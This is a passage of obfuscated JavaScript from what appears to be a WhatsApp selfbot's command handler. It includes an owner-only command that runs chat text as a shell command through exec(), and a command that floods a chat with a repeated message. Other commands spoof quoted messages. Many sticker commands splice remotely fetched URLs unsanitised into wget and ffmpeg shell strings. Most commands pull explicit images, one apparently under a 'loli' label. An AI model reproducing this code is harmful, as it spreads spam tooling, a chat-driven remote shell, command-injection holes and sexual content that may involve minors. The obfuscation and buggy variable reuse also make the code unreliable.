271569(0x406)+prefix+_0x271569(0x44c)+prefix+_0x271569(0x324)+prefix+_0x271569(0x1d2)+prefix+_0x271569(0x2c7)+prefix+_0x271569(0x338)+prefix+_0x271569(0x3b3)+prefix+_0x271569(0x1ba)+prefix+_0x271569(0x19c);_0x29151e(_0x2d89b7);break;case prefix+'on':if(!_0x15b2ca[_0x271569(0x46f)]['fromMe'])return;offline=![],_0x6bdcc6('En\x20linea\x20:D');break;case prefix+_0x271569(0x350):if(!_0x15b2ca[_0x271569(0x46f)]['fromMe'])return;offline=!![],waktu=Date[_0x271569(0x2bc)](),anuu=_0x794f7a['join']('\x20')?_0x794f7a[_0x271569(0x3ab)]('\x20'):'-',alasan=anuu,_0x6bdcc6(_0x271569(0x3b6));break;case prefix+_0x271569(0x223):_0x6bdcc6(_0x271569(0x2ef)+(offline?_0x271569(0x271):_0x271569(0x444))+'\x0a'+(banChats?'>\x20SELF-MODE':'>\x20PUBLIC-MODE'));break;case prefix+_0x271569(0x3df):if(!_0x15b2ca[_0x271569(0x46f)][_0x271569(0x31d)])return _0x6bdcc6(_0x271569(0x2dd));if(banChats===!![])return;uptime=process[_0x271569(0x1d3)](),banChats=!![],_0x6bdcc6(_0x271569(0x285));break;case prefix+_0x271569(0x287):if(!_0x15b2ca[_0x271569(0x46f)][_0x271569(0x31d)])return _0x6bdcc6(_0x271569(0x2dd));if(banChats===![])return;banChats=![],_0x6bdcc6(_0x271569(0x1a3));break;case prefix+_0x271569(0x43b):_0x138c14[_0x271569(0x247)](_0x282d63,WA_DEFAULT_EPHEMERAL);break;case prefix+_0x271569(0x46b):_0x138c14['toggleDisappearingMessages'](_0x282d63,0x0);break;case prefix+_0x271569(0x229):if(!_0x3d1dac)return _0x54c827(_0x271569(0x2dd));if(!_0x190db7)return _0x54c827(_0x271569(0x340)+prefix+_0x271569(0x280));argz=_0x190db7[_0x271569(0x2a7)]('|');if(!argz)return _0x54c827(_0x271569(0x340)+prefix+_0x271569(0x463));if(isNaN(argz[0x1]))return _0x54c827('harus\x20berupa\x20angka');for(let _0x47cb7c=0x0;_0x47cb7c<argz[0x1];_0x47cb7c++){_0x138c14[_0x271569(0x28d)](_0x282d63,argz[0x0],MessageType[_0x271569(0x459)],{'sendEphemeral':!![]});}break;case prefix+_0x271569(0x208):if(!_0x3d1dac)return _0x54c827(_0x271569(0x2dd));_0x138c14[_0x271569(0x195)](_0x282d63,ChatModification[_0x271569(0x208)],0x18*0x3c*0x3c*0x3e8),_0x54c827(_0x271569(0x2d7)),console['log'](_0x271569(0x26d)+_0x282d63);break;case prefix+_0x271569(0x21d):if(!_0x3d1dac)return _0x54c827(_0x271569(0x2dd));_0x138c14[_0x271569(0x195)](_0x282d63,ChatModification['unmute']),_0x54c827('*Ya\x20puedo\x20ver\x20sus\x20webadas\x20UnU*'),console['log'](_0x271569(0x269)+_0x282d63);break;case prefix+_0x271569(0x321):if(!_0x3d1dac)return _0x54c827('No\x20eres\x20mi\x20dueño\x20UnU');_0x54c827(_0x271569(0x23d)),console[_0x271569(0x1d4)](_0x271569(0x3e2)+_0x282d63),_0x138c14[_0x271569(0x195)](_0x282d63,ChatModification[_0x271569(0x321)]);break;case prefix+_0x271569(0x258):case prefix+_0x271569(0x3a1):if(_0x3d1dac)return _0x271569(0x395);if(!_0x10a56f)return _0xbe147b(mess[_0x271569(0x3c4)]);fake=_0x10a56f,_0xbe147b('Succes\x20Mengganti\x20Conversation\x20Fake\x20:\x20'+_0x10a56f);break;case prefix+_0x271569(0x24a):if(_0x3d1dac)return _0x271569(0x256);(_0xd2003&&!_0x15b2ca[_0x271569(0x352)][_0x271569(0x1bc)]||_0x2c43f4||_0x5e3250)&&_0x794f7a[_0x271569(0x41c)]==0x0?(boij=_0x2c43f4||_0x5e3250?JSON['parse'](JSON[_0x271569(0x3bd)](_0x15b2ca)[_0x271569(0x1eb)](_0x271569(0x1f8),'m'))[_0x271569(0x352)][_0x271569(0x45e)][_0x271569(0x397)]:_0x15b2ca,delb=await _0x138c14[_0x271569(0x39e)](boij),fs['writeFileSync'](_0x271569(0x346),delb),_0x6bdcc6('Hecho\x20mi\x20amo\x207~7')):_0x54c827(_0x271569(0x25b)+prefix+_0x271569(0x2f8));break;case prefix+'setprefix':if(_0x3d1dac)return _0x271569(0x256);prefix=_0x10a56f,_0xbe147b(_0x271569(0x3b2)+_0x10a56f);break;case prefix+_0x271569(0x3f8):if(_0x3d1dac)return _0x271569(0x256);(_0xd2003&&!_0x15b2ca[_0x271569(0x352)]['videoMessage']||_0x2c43f4||_0x5e3250)&&_0x794f7a['length']==0x0?(boij=_0x2c43f4||_0x5e3250?JSON[_0x271569(0x290)](JSON['stringify'](_0x15b2ca)[_0x271569(0x1eb)]('quotedM','m'))[_0x271569(0x352)]['extendedTextMessage'][_0x271569(0x397)]:_0x15b2ca,delb=await _0x138c14[_0x271569(0x39e)](boij),fs[_0x271569(0x296)](_0x271569(0x22a),delb),_0x6bdcc6(_0x271569(0x24e))):_0x54c827('Kirim\x20gambar\x20dengan\x20caption\x20'+prefix+_0x271569(0x2f8));break;case prefix+'settarget':if(_0x3d1dac)return _0x271569(0x256);if(!_0x10a56f)return _0x54c827(prefix+_0x271569(0x3ba));targetpc=_0x794f7a[0x0],_0xbe147b(_0x271569(0x29c)+targetpc);break;case prefix+_0x271569(0x3b7):if(!_0x3d1dac)return _0x54c827(_0x271569(0x3cb));if(!_0x10a56f)return _0xbe147b(mess[_0x271569(0x3c4)]);exec(_0x10a56f,(_0x5d83c3,_0x182bf5)=>{const _0x5a199c=_0x271569;if(_0x5d83c3)return _0xbe147b(_0x5a199c(0x2b9)+_0x5d83c3);_0x182bf5&&_0xbe147b(_0x182bf5);});break;case prefix+_0x271569(0x39d):ci=await covidindo();var {kasus:_0x5e025f,kematian:_0x37536a,sembuh:_0x35b552}=ci[0x0];_0x54c827('Caso\x20:\x20'+_0x5e025f+'\x0a\x0aMuerto\x20:\x20'+_0x37536a+_0x271569(0x391)+_0x35b552);break;case prefix+_0x271569(0x312):cw=await covidworld();var {kasus:_0x5e025f,kematian:_0x37536a,sembuh:_0x35b552}=cw[0x0];_0x54c827(_0x271569(0x367)+_0x5e025f+'\x0a\x0aMuertos\x20:\x20'+_0x37536a+_0x271569(0x1c1)+_0x35b552);break;case prefix+_0x271569(0x1b3):var _0x22eea7=await cnn();cn='CNN\x20NEWS';for(let _0x34d1fa=0x0;_0x34d1fa<_0x22eea7[_0x271569(0x41c)];_0x34d1fa++){cn+=_0x271569(0x262)+_0x22eea7[_0x34d1fa][_0x271569(0x237)]+_0x271569(0x2dc)+_0x22eea7[_0x34d1fa][_0x271569(0x38a)]+'\x0aImage:\x20'+_0x22eea7[_0x34d1fa][_0x271569(0x2b6)];}buff=await getBuffer(_0x22eea7[0x0][_0x271569(0x2b6)]),_0x138c14[_0x271569(0x28d)](_0x282d63,buff,MessageType['image'],{'caption':cn});break;case prefix+_0x271569(0x3ed):tres=await Gempa();var {Waktu:_0x59f651,Lintang:_0x36b484,Bujur:_0x13de2c,Magnitude:_0x3ed876,Kedalaman:_0x14f0ed,Wilayah:_0xfcc446,Map:_0x2a5f59}=tres[_0x271569(0x373)];console[_0x271569(0x1d4)](_0x2a5f59),captt=_0x271569(0x2ba)+_0x59f651+_0x271569(0x3c5)+_0x36b484+'\x0aBujur\x20:\x20'+_0x13de2c+_0x271569(0x1ec)+_0xfcc446,thumbbb=await getBuffer(_0x2a5f59),_0x138c14[_0x271569(0x28d)](_0x282d63,thumbbb,MessageType[_0x271569(0x1d5)],{'caption':''+captt});break;case prefix+_0x271569(0x209):if(!_0x10a56f)return _0x54c827(_0x271569(0x2cd))['then'](_0x258cf2=>_0x258cf2[_0x271569(0x38b)]());qweryna=_0x794f7a[_0x271569(0x3ab)]('\x20'),eses=await axios[_0x271569(0x209)](_0x271569(0x1a8)+qweryna+'&full_page=true&fresh=true&output=json&file_type=png&wait_for_event=load'),buffqw=await getBuffer(eses[_0x271569(0x1a4)][_0x271569(0x438)]),_0x138c14['sendMessage'](_0x282d63,buffqw,_0x5ebec8,{'quoted':_0x15b2ca})['catch'](_0x13d839=>{return'Repitiendo\x20señor\x20hay\x20un\x20errorc...';});break;case prefix+_0x271569(0x360):if(_0x794f7a['length']<0x1)return _0x54c827(_0x271569(0x289));var _0x4ed511=_0x794f7a[_0x271569(0x3ab)]('\x20'),_0xfe4e9f=await fetchJson('https://sonar.omnisint.io/reverse/'+_0x4ed511);_0x138c14[_0x271569(0x28d)](_0x282d63,''+_0xfe4e9f,_0xfa1a73)[_0x271569(0x268)](_0x3ae3f0=>{const _0x2233c0=_0x271569;_0x54c827(_0x2233c0(0x2f0));});break;case prefix+_0x271569(0x37a):_0x2d949b=await axios['get'](_0x271569(0x1f2)),avatars=await getBuffer(_0x2d949b['data'][_0x271569(0x2eb)]),_0x138c14[_0x271569(0x28d)](_0x282d63,avatars,_0x5ebec8,{'quoted':_0x15b2ca});break;case prefix+_0x271569(0x3f5):_0x2d949b=await axios['get'](_0x271569(0x3f1)),loliz=await getBuffer(_0x2d949b[_0x271569(0x1a4)]['url']),_0x138c14[_0x271569(0x28d)](_0x282d63,loliz,_0x5ebec8,{'quoted':_0x15b2ca});break;case prefix+_0x271569(0x218):waifud=await axios[_0x271569(0x209)]('https://nekos.life/api/v2/img/waifu'),nyed=await getBuffer(waifud[_0x271569(0x1a4)][_0x271569(0x2eb)]),_0x138c14[_0x271569(0x28d)](_0x282d63,nyed,_0x5ebec8,{'caption':'Gatau\x20caption\x20nya\x20apa','quoted':_0x15b2ca})[_0x271569(0x268)](_0x574a85=>{const _0x23a300=_0x271569;return _0x23a300(0x460);});break;case prefix+'husbu':husbud=await fetchJson(_0x271569(0x281)),sasu=JSON['parse'](JSON[_0x271569(0x3bd)](husbud)),ke=sasu[Math['floor'](Math[_0x271569(0x3c8)]()*sasu[_0x271569(0x41c)])],nye=await getBuffer(ke),_0x138c14[_0x271569(0x28d)](_0x282d63,nye,_0x5ebec8,{'caption':'Gatau\x20caption\x20nya\x20apa','quoted':_0x15b2ca})['catch'](_0x2844ae=>{const _0x378e9e=_0x271569;return _0x378e9e(0x1d0);});break;case prefix+'image':if(_0x794f7a[_0x271569(0x41c)]<0x1)return _0x54c827(_0x271569(0x35b));const _0x4c432a=_0x794f7a['join']('');_0x54c827(mess[_0x271569(0x28e)]),gis(_0x4c432a,async(_0x393029,_0x1e3a9a)=>{const _0x4b8898=_0x271569;n=_0x1e3a9a,images=n[Math[_0x4b8898(0x227)](Math[_0x4b8898(0x3c8)]()*n[_0x4b8898(0x41c)])][_0x4b8898(0x2eb)],_0x138c14['sendMessage'](_0x282d63,{'url':images},_0x5ebec8,{'quoted':_0x15b2ca});});break;case prefix+_0x271569(0x461):goblog=_0x794f7a[_0x271569(0x3ab)]('\x20'),_0x2d949b=await fetchJson('https://api.fdci.se/rep.php?gambar='+goblog),sasu=JSON[_0x271569(0x290)](JSON[_0x271569(0x3bd)](_0x2d949b)),ke=sasu[Math[_0x271569(0x227)](Math[_0x271569(0x3c8)]()*sasu[_0x271569(0x41c)])],nye=await getBuffer(ke),_0x138c14[_0x271569(0x28d)](_0x282d63,nye,_0x5ebec8,{'caption':'SATANCITO\x20ᵈᵃʳʸ⛥','quoted':_0x15b2ca})['catch'](_0xba6ebb=>{const _0x566ba3=_0x271569;return _0x566ba3(0x331);});break;case prefix+_0x271569(0x226):_0x54c827(mess[_0x271569(0x28e)]),fetch(_0x271569(0x429))[_0x271569(0x3e5)](_0x4039d8=>_0x4039d8[_0x271569(0x459)]())[_0x271569(0x3e5)](_0x50e379=>{const _0xb3603b=_0x271569;let _0x1f6d28=_0x50e379[_0xb3603b(0x2a7)]('\x0a'),_0x356c8b=_0x1f6d28[Math[_0xb3603b(0x227)](Math[_0xb3603b(0x3c8)]()*_0x1f6d28['length'])];imageToBase64(_0x356c8b)[_0xb3603b(0x3e5)](_0x215417=>{const _0x395b29=_0xb3603b;media=Buffer[_0x395b29(0x238)](_0x215417,_0x395b29(0x387)),_0x138c14['sendMessage'](_0x282d63,media,_0x5ebec8,{'quoted':_0x15b2ca,'caption':'NIH'});})[_0xb3603b(0x268)](_0x3708af=>{const _0x3a90f4=_0xb3603b;console[_0x3a90f4(0x1d4)](_0x3708af);});});break;case prefix+_0x271569(0x2f6):wanime=await axios[_0x271569(0x209)]('https://nekos.life/api/v2/img/wallpaper'),bufwanime=await getBuffer(wanime[_0x271569(0x1a4)][_0x271569(0x2eb)]),_0x138c14[_0x271569(0x28d)](_0x282d63,bufwanime,_0x5ebec8,{'quoted':_0x15b2ca})[_0x271569(0x268)](_0x259375=>{const _0xaaa6e7=_0x271569;return _0xaaa6e7(0x310);});break;case prefix+_0x271569(0x272):_0x2d949b=await axios['get'](_0x271569(0x335)),nsavatar=await getBuffer(_0x2d949b[_0x271569(0x1a4)][_0x271569(0x2eb)]),_0x138c14[_0x271569(0x28d)](_0x282d63,nsavatar,_0x5ebec8,{'quoted':_0x15b2ca})[_0x271569(0x268)](_0x335340=>{const _0x1571c0=_0x271569;return _0x1571c0(0x1c3);});break;case prefix+_0x271569(0x2c0):ranp=getRandom(_0x271569(0x470)),rano=getRandom(_0x271569(0x33b)),_0x2d949b=await axios['get'](_0x271569(0x2a3)),exec(_0x271569(0x20d)+_0x2d949b[_0x271569(0x1a4)][_0x271569(0x2eb)]+_0x271569(0x3c1)+ranp+'\x20&&\x20ffmpeg\x20-i\x20'+ranp+'\x20-vcodec\x20libwebp\x20-filter:v\x20fps=fps=15\x20-lossless\x201\x20-loop\x200\x20-preset\x20default\x20-an\x20-vsync\x200\x20-s\x20512:512\x20'+rano,_0x45ae38=>{const _0x301397=_0x271569;fs[_0x301397(0x3f7)](ranp);if(_0x45ae38)return _0x54c827(_0x301397(0x309));buffer=fs[_0x301397(0x2d2)](rano),_0x138c14['sendMessage'](_0x282d63,buffer,MessageType[_0x301397(0x1a5)],{'quoted':_0x15b2ca}),fs[_0x301397(0x3f7)](rano);});break;case prefix+_0x271569(0x3ae):ranp=getRandom(_0x271569(0x470)),rano=getRandom(_0x271569(0x33b)),_0x2d949b=await axios[_0x271569(0x209)](_0x271569(0x250)),exec(_0x271569(0x20d)+_0x2d949b[_0x271569(0x1a4)][_0x271569(0x2eb)]+_0x271569(0x3c1)+ranp+_0x271569(0x3e3)+ranp+'\x20-vcodec\x20libwebp\x20-filter:v\x20fps=fps=15\x20-lossless\x201\x20-loop\x200\x20-preset\x20default\x20-an\x20-vsync\x200\x20-s\x20512:512\x20'+rano,_0x228b08=>{const _0x56eaf1=_0x271569;fs[_0x56eaf1(0x3f7)](ranp);if(_0x228b08)return _0x54c827(_0x56eaf1(0x309));buffer=fs[_0x56eaf1(0x2d2)](rano),_0x138c14['sendMessage'](_0x282d63,buffer,MessageType['sticker'],{'quoted':_0x15b2ca}),fs['unlinkSync'](rano);});break;case prefix+_0x271569(0x1ce):pusiimg=await axios[_0x271569(0x209)](_0x271569(0x1c5)),bufpusy=await getBuffer(pusiimg[_0x271569(0x1a4)][_0x271569(0x2eb)]),_0x138c14[_0x271569(0x28d)](_0x282d63,bufpusy,MessageType['image'],{'quoted':_0x15b2ca})['catch'](_0x160aa4=>{const _0x317920=_0x271569;return _0x317920(0x1c3);});break;case prefix+_0x271569(0x2ed):opai=await axios['get'](_0x271569(0x293)),opaiz=await getBuffer(opai['data'][_0x271569(0x2eb)]),_0x138c14['sendMessage'](_0x282d63,opaiz,_0x5ebec8,{'quoted':_0x15b2ca})['catch'](_0x1578b1=>{const _0x574de8=_0x271569;return _0x574de8(0x1c3);});break;case prefix+_0x271569(0x270):ranp=getRandom(_0x271569(0x470)),rano=getRandom(_0x271569(0x33b)),_0x2d949b=await axios['get'](_0x271569(0x342)),exec(_0x271569(0x20d)+_0x2d949b[_0x271569(0x1a4)][_0x271569(0x2eb)]+_0x271569(0x3c1)+ranp+_0x271569(0x3e3)+ranp+_0x271569(0x347)+rano,_0x21e155=>{const _0x28ac00=_0x271569;fs[_0x28ac00(0x3f7)](ranp);if(_0x21e155)return _0x54c827(_0x28ac00(0x309));buffer=fs[_0x28ac00(0x2d2)](rano),_0x138c14['sendMessage'](_0x282d63,buffer,MessageType[_0x28ac00(0x1a5)],{'quoted':_0x15b2ca}),fs[_0x28ac00(0x3f7)](rano);});break;case prefix+'bj':ranp=getRandom('.gif'),rano=getRandom('.webp'),_0x2d949b=await axios[_0x271569(0x209)](_0x271569(0x1bf)),exec(_0x271569(0x20d)+_0x2d949b[_0x271569(0x1a4)][_0x271569(0x2eb)]+_0x271569(0x3c1)+ranp+'\x20&&\x20ffmpeg\x20-i\x20'+ranp+'\x20-vcodec\x20libwebp\x20-filter:v\x20fps=fps=15\x20-lossless\x201\x20-loop\x200\x20-preset\x20default\x20-an\x20-vsync\x200\x20-s\x20512:512\x20'+rano,_0x4ba1a5=>{const _0x2ebb36=_0x271569;fs['unlinkSync'](ranp);if(_0x4ba1a5)return _0x54c827(_0x2ebb36(0x309));buffer=fs[_0x2ebb36(0x2d2)](rano),_0x138c14[_0x2ebb36(0x28d)](_0x282d63,buffer,MessageType[_0x2ebb36(0x1a5)],{'quoted':_0x15b2ca}),fs[_0x2ebb36(0x3f7)](rano);});break;case prefix+_0x271569(0x2e3):eroz=await axios[_0x271569(0x209)]('https://nekos.life/api/v2/img/ero'),bufero=await getBuffer(eroz[_0x271569(0x1a4)][_0x271569(0x2eb)]),_0x138c14['sendMessage'](_0x282d63,bufero,_0x5ebec8,{'quoted':_0x15b2ca})[_0x271569(0x268)](_0x111c1b=>{return'Error\x207-7.';});break;case prefix+_0x271569(0x1d1):erokz=await axios[_0x271569(0x209)](_0x271569(0x30b)),erokzs=await getBuffer(erokz[_0x271569(0x1a4)][_0x271569(0x2eb)]),_0x138c14[_0x271569(0x28d)](_0x282d63,erokzs,_0x5ebec8,{'quoted':_0x15b2ca})[_0x271569(0x268)](_0x231521=>{const _0x1e244c=_0x271569;return _0x1e244c(0x1c3);});break;case prefix+_0x271569(0x366):eroyuriz=await axios[_0x271569(0x209)]('https://nekos.life/api/v2/img/eroyuri'),buferoyu=await getBuffer(opai['data']['url']),_0x138c14['sendMessage'](_0x282d63,buferoyu,_0x5ebec8,{'quoted':_0x15b2ca})['catch'](_0x45814b=>{return'Error\x207-7';});break;case prefix+_0x271569(0x3a9):ranp=getRandom('.gif'),rano=getRandom(_0x271569(0x33b)),_0x2d949b=await axios[_0x271569(0x209)](_0x271569(0x1ca)),exec(_0x271569(0x20d)+_0x2d949b[_0x271569(0x1a4)]['url']+_0x271569(0x3c1)+ranp+_0x271569(0x3e3)+ranp+_0x271569(0x347)+rano,_0x901527=>{const _0x6c6dd=_0x271569;fs[_0x6c6dd(0x3f7)](ranp);if(_0x901527)return _0x54c827(_0x6c6dd(0x309));buffer=fs[_0x6c6dd(0x2d2)](rano),_0x138c14[_0x6c6dd(0x28d)](_0x282d63,buffer,MessageType[_0x6c6dd(0x1a5)],{'quoted':_0x15b2ca}),fs[_0x6c6dd(0x3f7)](rano);});break;case prefix+_0x271569(0x38d):ranp=getRandom(_0x271569(0x470)),rano=getRandom(_0x271569(0x33b)),_0x2d949b=await axios[_0x271569(0x209)](_0x271569(0x286)),exec(_0x271569(0x20d)+_0x2d949b[_0x271569(0x1a4)][_0x271569(0x2eb)]+_0x271569(0x3c1)+ranp+_0x271569(0x3e3)+ranp+_0x271569(0x347)+rano,_0x49152c=>{const _0x4a1860=_0x271569;fs[_0x4a1860(0x3f7)](ranp);if(_0x49152c)return _0x54c827(_0x4a1860(0x309));buffer=fs[_0x4a1860(0x2d2)](rano),_0x138c14[_0x4a1860(0x28d)](_0x282d63,buffer,MessageType[_0x4a1860(0x1a5)],{'quoted':_0x15b2ca}),fs['unlinkSync'](rano);});break;case prefix+_0x271569(0x301):ranp=getRandom(_0x271569(0x470)),rano=getRandom('.webp'),_0x2d949b=await axios['get'](_0x271569(0x327)),exec('wget\x20'+_0x2d949b[_0x271569(0x1a4)][_0x271569(0x2eb)]+_0x271569(0x3c1)+ranp+_0x271569(0x3e3)+ranp+_0x271569(0x347)+rano,_0x583a4a=>{const _0x5d541c=_0x271569;fs['unlinkSync'](ranp);if(_0x583a4a)return _0x54c827(_0x5d541c(0x309));buffer=fs[_0x5d541c(0x2d2)](rano),_0x138c14['sendMessage'](_0x282d63,buffer,MessageType[_0x5d541c(0x1a5)],{'quoted':_0x15b2ca}),fs['unlinkSync'](rano);});break;case prefix+_0x271569(0x31a):_0x2d949b=await axios[_0x271569(0x209)]('https://nekos.life/api/v2/img/femdom'),bupemdom=await getBuffer(_0x2d949b[_0x271569(0x1a4)][_0x271569(0x2eb)]),_0x138c14[_0x271569(0x28d)](_0x282d63,bupemdom,_0x5ebec8,{'quoted':_0x15b2ca})[_0x271569(0x268)](_0x37f87e=>{const _0x52ef4e=_0x271569;return _0x52ef4e(0x1c3);});break;case prefix+_0x271569(0x305):futan=await axios[_0x271569(0x209)](_0x271569(0x2c9)),futanz=await getBuffer(futan[_0x271569(0x1a4)]['url']),_0x138c14[_0x271569(0x28d)](_0x282d63,futanz,_0x5ebec8,{'quoted':_0x15b2ca});break;case prefix+'les':ranp=getRandom(_0x271569(0x470)),rano=getRandom('.webp'),_0x2d949b=await axios[_0x271569(0x209)](_0x271569(0x38e)),exec(_0x271569(0x20d)+_0x2d949b[_0x271569(0x1a4)]['url']+'\x20-O\x20'+ranp+_0x271569(0x3e3)+ranp+_0x271569(0x347)+rano,_0x5cc58c=>{const _0x181a6e=_0x271569;fs['unlinkSync'](ranp);if(_0x5cc58c)return _0x54c827(_0x181a6e(0x309));buffer=fs[_0x181a6e(0x2d2)](rano),_0x138c14[_0x181a6e(0x28d)](_0x282d63,buffer,MessageType[_0x181a6e(0x1a5)],{'quoted':_0x15b2ca}),fs[_0x181a6e(0x3f7)](rano);});break;case prefix+_0x271569(0x28c):trapx=await axios[_0x271569(0x209)](_0x271569(0x293)),traps=await getBuffer(trapx[_0x271569(0x1a4)][_0x271569(0x2eb)]),_0x138c14[_0x271569(0x28d)](_0x282d63,traps,_0x5ebec8,{'quoted':_0x15b2ca})['catch'](_0x1c61b6=>{const _0x5ae750=_0x271569;return _0x5ae750(0x1c3);});break;case prefix+_0x271569(0x260):ranp=getRandom('.gif'),rano=getRandom(_0x271569(0x33b)),_0x2d949b=await axios[_0x271569(0x209)](_0x271569(0x410)),exec(_0x271569(0x20d)+_0x2d949b[_0x271569(0x1a4)][_0x271569(0x2eb)]+'\x20-O\x20'+ranp+'\x20&&\x20ffmpeg\x20-i\x20'+ranp+'\x20-vcodec\x20libwebp\x20-filter:v\x20fps=fps=15\x20-lossless\x201\x20-loop\x200\x20-preset\x20default\x20-an\x20-vsync\x200\x20-s\x20512:512\x20'+rano,_0x3a8300=>{const _0x379b1e=_0x271569;fs[_0x379b1e(0x3f7)](ranp);if(_0x3a8300)return _0x54c827(_0x379b1e(0x309));buffer=fs[_0x379b1e(0x2d2)](rano),_0x138c14[_0x379b1e(0x28d)](_0x282d63,buffer,MessageType[_0x379b1e(0x1a5)],{'quoted':_0x15b2ca}),fs[_0x379b1e(0x3f7)](rano);});break;case prefix+_0x271569(0x368):ranp=getRandom(_0x271569(0x470)),rano=getRandom(_0x271569(0x33b)),_0x2d949b=await axios[_0x271569(0x209)](_0x271569(0x333)),exec(_0x271569(0x20d)+_0x2d949b['data'][_0x271569(0x2eb)]+_0x271569(0x3c1)+ranp+_0x271569(0x3e3)+ranp+_0x271569(0x347)+rano,_0x54479b=>{const _0xdb75e8=_0x271569;fs[_0xdb75e8(0x3f7)](ranp);if(_0x54479b)return _0x54c827(_0xdb75e8(0x309));buffer=fs[_0xdb75e8(0x2d2)](rano),_0x138c14[_0xdb75e8(0x28d)](_0x282d63,buffer,MessageType[_0xdb75e8(0x1a5)],{'quoted':_0x15b2ca}),fs[_0xdb75e8(0x3f7)](rano);});break;case prefix+'blowjob':blowz=await axios['get'](_0x271569(0x1a6)),bufblowz=await getBuffer(blowz[_0x271569(0x1a4)][_0x271569(0x2eb)]),_0x138c14['sendMessage'](_0x282d63,bufblowz,_0x5ebec8,{'quoted':_0x15b2ca})[_0x271569(0x268)](_0x490493=>{return'Error\x207-7.';});break;case prefix+_0x271569(0x20f):hentaiz=await axios[_0x271569(0x209)](_0x271569(0x3e1)),bufhtz=await getBuffer(hentaiz['data'][_0x271569(0x2eb)]),_0x138c14['sendMessage'](_0x282d63,bufhtz,_0x5ebec8,{'quoted':_0x15b2ca})[_0x271569(0x268)](_0x177b08=>{return'Error\x207-7.';});break;case prefix+'hololewed':hololew=await axios['get'](_0x271569(0x1d9)),hololewx=await getBuffer(hololew[_0x271569(0x1a4)][_0x271569(0x2eb)]),_0x138c14[_0x271569(0x28d)](_0x282d63,hololewx,_0x5ebec8,{'quoted':_0x15b2ca})[_0x271569(0x268)](_0x38f60f=>{const _0x475ba7=_0x271569;return _0x475ba7(0x440);});break;case prefix+_0x271569(0x3db):lewdd=await axios[_0x271569(0x209)](_0x271569(0x46e)),buflewd=await getBuffer(lewdd['data'][_0x271569(0x2eb)]),_0x138c14['sendMessage'](_0x282d63,buflewd,_0x5ebec8,{'quoted':_0x15b2ca});break;case prefix+'lewdk':lewdkk=await axios[_0x271569(0x209)]('https://nekos.life/api/v2/img/lewdk'),lewdkz=await getBuffer(lewdkz['data']['url']),_0x138c14[_0x271569(0x28d)](_0x282d63,lewdkz,_0x5ebec8,{'quoted':_0x15b2ca})[_0x271569(0x268)](_0x120a72=>{return'Pwro..';});break;case prefix+'lewdkemo':lewdkm=await axios['get'](_0x271569(0x2df)),buflewd=await getBuffer(lewdkm[_0x271569(0x1a4)]['url']),_0x138c14[_0x271569(0x28d)](_0x282d63,buflewd,_0x5ebec8,{'quoted':_0x15b2ca})[_0x271569(0x268)](_0x54a417=>{const _0x458531=_0x271569;return _0x458531(0x26e);});break;case prefix+_0x271569(0x46d):ranp=getRandom(_0x271569(0x470)),rano=getRandom(_0x271569(0x33b)),_0x2d949b=await axios[_0x271569(0x209)](_0x271569(0x3cc)),exec(_0x271569(0x20d)+_0x2d949b[_0x271569(0x1a4)]['url']+'\x20-O\x20'+ranp+'\x20&&\x20ffmpeg\x20-i\x20'+ranp+_0x271569(0x347)+rano,_0x44394d=>{const _0x531281=_0x271569;fs['unlinkSync'](ranp);if(_0x44394d)return _0x54c827('error');buffer=fs[_0x531281(0x2d2)](rano),_0x138c14[_0x531281(0x28d)](_0x282d63,buffer,MessageType[_0x531281(0x1a5)],{'quoted':_0x15b2ca}),fs['unlinkSync'](rano);});break;case prefix+_0x271569(0x1de):ranp=getRandom('.gif'),rano=getRandom(_0x271569(0x33b)),_0x2d949b=await axios['get']('https://nekos.life/api/v2/img/solog'),exec('wget\x20'+_0x2d949b['data'][_0x271569(0x2eb)]+_0x271569(0x3c1)+ranp+_0x271569(0x3e3)+ranp+'\x20-vcodec\x20libwebp\x20-filter:v\x20fps=fps=15\x20-lossless\x201\x20-loop\x200\x20-preset\x20default\x20-an\x20-vsync\x200\x20-s\x20512:512\x20'+rano,_0x10491d=>{const _0x2006ab=_0x271569;fs['unlinkSync'](ranp);if(_0x10491d)return _0x54c827(_0x2006ab(0x309));buffer=fs[_0x2006ab(0x2d2)](rano),_0x138c14[_0x2006ab(0x28d)](_0x282d63,buffer,MessageType[_0x2006ab(0x1a5)],{'quoted':_0x15b2ca}),fs['unlinkSync'](rano);});break;case prefix+_0x271569(0x445):yuriz=await axios[_0x271569(0x209)](_0x271569(0x293)),bupyuri=await getBuffer(yuriz[_0x271569(0x1a4)][_0x271569(0x2eb)]),_0x138c14[_0x271569(0x28d)](_0x282d63,bupyuri,_0x5ebec8,{'quoted':_0x15b2ca})[_0x271569(0x268)](_0x2eefbe=>{const _0x4b989e=_0x271569;return _0x4b989e(0x1c3);});break;case prefix+_0x271569(0x2ee):ranp=getRandom(_0x271569(0x470)),rano=getRandom(_0x271569(0x33b)),_0x2d949b=await axios[_0x271569(0x209)](_0x271569(0x41a)),exec(_0x271569(0x20d)+_0x2d949b['data'][_0x271569(0x2eb)]+_0x271569(0x3c1)+ranp+_0x271569(0x3e3)+ranp+_0x271569(0x347)+rano,_0x1cfb61=>{const _0x3514ce=_0x271569;fs[_0x3514ce(0x3f7)](ranp);if(_0x1cfb61)return _0x54c827(_0x3514ce(0x309));buffer=fs['readFileSync'](rano),_0x138c14[_0x3514ce(0x28d)](_0x282d63,buffer,MessageType[_0x3514ce(0x1a5)],{'quoted':_0x15b2ca}),fs[_0x3514ce(0x3f7)](rano);});break;case prefix+_0x271569(0x3b9):ranp=getRandom(_0x271569(0x470)),rano=getRandom('.webp'),_0x2d949b=await axios[_0x271569(0x209)](_0x271569(0x3a4)),exec(_0x271569(0x20d)+_0x2d949b['data']['url']+'\x20-O\x20'+ranp+_0x271569(0x3e3)+ranp+'\x20-vcodec\x20libwebp\x20-filter:v\x20fps=fps=15\x20-lossless\x201\x20-loop\x200\x20-preset\x20default\x20-an\x20-vsync\x200\x20-s\x20512:512\x20'+rano,_0x312f53=>{const _0x21d982=_0x271569;fs['unlinkSync'](ranp);if(_0x312f53)return _0x54c827(_0x21d982(0x309));buffer=fs['readFileSync'](rano),_0x138c14['sendMessage'](_0x282d63,buffer,MessageType[_0x21d982(0x1a5)],{'quoted':_0x15b2ca}),fs[_0x21d982(0x3f7)](rano);});break;case prefix+'eron':eronz=await axios[_0x271569(0x209)](_0x271569(0x314)),buferon=await getBuffer(eronz['data'][_0x271569(0x2eb)]),_0x138c14[_0x271569(0x28d)](_0x282d63,buferon,_0x5ebec8,{'quoted':_0x15b2ca})['catch'](_0x16a802=>{return'Error\x207-7..';});break;case 